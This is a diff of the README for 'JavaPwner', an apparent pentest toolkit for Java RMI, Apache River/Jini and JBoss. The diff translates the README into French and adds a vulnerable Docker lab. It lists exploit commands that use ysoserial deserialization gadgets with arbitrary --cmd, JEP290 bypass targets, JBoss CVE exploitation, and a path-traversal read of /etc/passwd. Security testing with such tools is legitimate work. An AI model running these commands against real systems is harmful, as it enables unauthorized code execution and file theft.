@@ -1,87 +1,139 @@
 # JavaPwner
 
-Python pentest toolkit targeting Java middleware protocols. Starts with Apache River / Jini (port 4160).
+Outil de pentest Python pour les protocoles Java middleware vulnérables.
 
-## Requirements
+**Protocoles couverts :** Java RMI · Apache River / Jini · JBoss AS 4.x
+
+---
+
+## Prérequis
 
 - Python 3.10+
-- Java JDK (pour compilation et exécution — `java` + `javac`)
-- [ysoserial-all.jar](https://github.com/frohoff/ysoserial/releases) → place as `lib/ysoserial.jar`
+- Java JDK (`java` + `javac` dans le PATH) — pour la génération de payloads
+- [ysoserial-all.jar](https://github.com/frohoff/ysoserial/releases) placé dans `lib/ysoserial.jar`
 
-## Install
+---
+
+## Installation
 
 ```bash
 python -m venv .venv && source .venv/bin/activate
 pip install -e .
 ```
 
-## Usage
+Vérifier :
 
 ```bash
-# Scan (Tier 1 — heuristique, sans JVM)
-javapwner jini scan -t 192.168.1.10
-
-# Scan avec inspection Tier 2 (nécessite JDK + JARs River, voir ci-dessous)
-javapwner jini scan -t 192.168.1.10 --tier2
-
-# Inspection admin dédiée (Tier 2)
-javapwner jini admin -t 192.168.1.10
-
-# List available gadgets
-javapwner jini gadgets
-
-# Exploit
-javapwner jini exploit -t 192.168.1.10 --gadget CommonsCollections6 --cmd 'id'
-
-# Probe for JEP290 filters (URLDNS)
-javapwner jini exploit -t 192.168.1.10 --gadget URLDNS --cmd http://cb.burpcollaborator.net \
-  --jep290-probe --dns-url http://cb.burpcollaborator.net
+javapwner --help
 ```
 
-Global flags: `--verbose`, `--json`, `--timeout`, `--ysoserial <path>`
+---
 
-## Tier 2 — Setup JVM Bridge (Kali Linux)
+## Utilisation rapide
 
-Le Tier 2 permet de se connecter réellement au Registrar Jini pour :
-- Vérifier si le Registrar est `Administrable` (appel `getAdmin()`)
-- Détecter les capacités admin : `JoinAdmin`, `DestroyAdmin`, `StorageLocationAdmin`
-- Lister tous les services enregistrés dans le Lookup Service
-
-Les JARs Apache River (`jsk-lib`, `jsk-platform`) sont déjà inclus dans `lib/`.
-Seul prérequis : un JDK.
+### Java RMI
 
 ```bash
-sudo apt update && sudo apt install -y default-jdk
-java -version && javac -version
+# Scanner un endpoint RMI (ports courants auto-détectés si -p omis)
+javapwner rmi scan -t 10.0.0.5
+javapwner rmi scan -t 10.0.0.5 -p 1099
+
+# Exploiter (auto-détection du gadget si --gadget omis)
+javapwner rmi exploit -t 10.0.0.5 -p 1099 --cmd 'id'
+javapwner rmi exploit -t 10.0.0.5 -p 1099 --gadget CommonsCollections6 --cmd 'id'
+
+# Scanner plusieurs ports en parallèle
+javapwner rmi discover -t 10.0.0.5
 ```
 
-Vérifier le setup :
+### Apache River / Jini
 
 ```bash
-javapwner jini admin -t 192.168.1.10
+# Scanner le Lookup Service (port 4160 = Unicast Discovery)
+javapwner jini scan -t 10.0.0.5 -p 4160
+
+# Exploiter via le port JRMP du Registrar (typiquement 4162)
+javapwner jini exploit -t 10.0.0.5 -p 4162 --gadget CommonsCollections6 --cmd 'id'
+
+# Lecture de fichier via path traversal codebase
+javapwner jini read-file -t 10.0.0.5 -p 4160 --path /etc/passwd
+
+# Découverte multicast (LAN)
+javapwner jini multicast --wait 3
 ```
 
-Si un prérequis manque, l'outil affiche un message d'erreur explicite.
+### JBoss AS 4.x
 
-### Configuration avancée
+```bash
+# Scanner et fingerprinter (port 8080)
+javapwner jboss scan -t 10.0.0.5 -p 8080
 
-Au lieu de copier les JARs dans `lib/`, vous pouvez utiliser :
+# Exploiter via HTTP Invoker (CVE-2015-7501 / CVE-2017-7504)
+javapwner jboss exploit -t 10.0.0.5 -p 8080 --gadget CommonsCollections6 --cmd 'id'
 
-| Méthode | Exemple |
-|---|---|
-| Flag `--classpath` | `javapwner jini scan -t HOST --tier2 --classpath /opt/river/lib/jsk-lib.jar:/opt/river/lib/jsk-platform.jar` |
-| Variable `JINI_CLASSPATH` | `export JINI_CLASSPATH=/opt/river/lib/jsk-lib.jar:/opt/river/lib/jsk-platform.jar` |
-| Variable `RIVER_HOME` | `export RIVER_HOME=/opt/river` (cherche automatiquement dans `lib/`) |
-| Variable `JAVA_HOME` | `export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64` |
+# Scanner le canal JNP (JBoss JNDI/RMI, port 4444 / 1099)
+javapwner jboss jnp-scan -t 10.0.0.5
+javapwner jboss jnp-exploit -t 10.0.0.5 --gadget CommonsCollections6 --cmd 'id'
+```
+
+---
+
+## Options globales
+
+| Flag | Description |
+|------|-------------|
+| `--verbose` | Affichage détaillé (hex dumps, timings) |
+| `--json` | Sortie JSON (pour scripting / pipelines) |
+| `--timeout N` | Timeout réseau en secondes (défaut : 5) |
+| `--ysoserial <path>` | Chemin vers ysoserial.jar (ou `YSOSERIAL_PATH` env) |
+
+---
+
+## Lab vulnérable local
+
+Un environnement Docker est fourni dans `lab/` pour tester en local.
+
+```bash
+cd lab/
+docker compose up -d --build
+docker compose logs -f         # attendre que tous les services soient prêts
+```
+
+Services disponibles après démarrage :
+
+| Target | Port | Scénario |
+|--------|------|---------|
+| `rmi-java8` | 1099 | Java 8 LTS — JEP290 bypassé par réflexion |
+| `rmi-java8-pre-jep290` | 1499 | Java 8u111 — aucun filtre (pre-JEP290) |
+| `rmi-java8-jep290-configurable` | 1599 | Java 8u202 — filtre ouvert par propriété système |
+| `rmi-java11` | 1199 | Java 11 LTS — bypass Unsafe |
+| `rmi-java17` | 1299 | Java 17 LTS — bypass Unsafe |
+| `rmi-java21` | 1399 | Java 21 LTS — bypass Unsafe |
+| `jini-reggie` | 4160 / 4162 | Apache River 2.2.3 |
+| `jboss4` | 8080 / 4444 | JBoss AS 4.2.3.GA |
+
+Voir `lab/README.md` pour les commandes d'exploitation complètes.
+
+---
+
+## JVM Bridge (Tier 2 Jini)
+
+Le Tier 2 Jini nécessite un JDK installé (les JARs Apache River sont déjà dans `lib/`) :
+
+```bash
+sudo apt install -y default-jdk    # Kali / Debian
+javapwner jini scan -t 10.0.0.5 --tier2
+javapwner jini admin -t 10.0.0.5
+```
+
+---
 
 ## Tests
 
 ```bash
-pip install -e ".[dev]"
-pytest tests/
-```
+# Tests unitaires
+.venv/bin/pytest tests/ --ignore=tests/integration -q
 
-Live integration tests (require a running Reggie):
-```bash
-JINI_TARGET_HOST=192.168.1.10 pytest tests/integration/ -m live
+# Tests d'intégration (nécessite un Reggie actif)
+JINI_TARGET_HOST=127.0.0.1 .venv/bin/pytest tests/integration/ -m live
 ```
